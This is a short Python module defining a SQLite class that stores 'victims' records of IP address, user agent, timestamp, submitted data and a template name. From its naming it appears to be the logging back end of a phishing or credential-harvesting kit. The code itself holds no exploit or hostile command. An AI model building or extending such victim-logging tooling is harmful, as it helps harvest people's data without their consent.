import sqlite3, json
from pathlib import Path

class Database:
    def __init__(self, db_path='logs/victims.db'):
        Path('logs').mkdir(exist_ok=True)
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.c = self.conn.cursor()
        self.c.execute('''CREATE TABLE IF NOT EXISTS victims(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT, ua TEXT, ts TEXT, data TEXT, tpl TEXT)''')
        self.conn.commit()
    
    def save(self, v):
        self.c.execute('INSERT INTO victims(ip,ua,ts,data,tpl) VALUES(?,?,?,?,?)',
            (v['ip'], v['ua'], v['ts'], json.dumps(v['data']), v['tpl']))
        self.conn.commit()
    
    def count(self):
        self.c.execute('SELECT COUNT(*) FROM victims')
        return self.c.fetchone()[0]
    
    def all(self):
        self.c.execute('SELECT * FROM victims ORDER BY id DESC')
        return self.c.fetchall()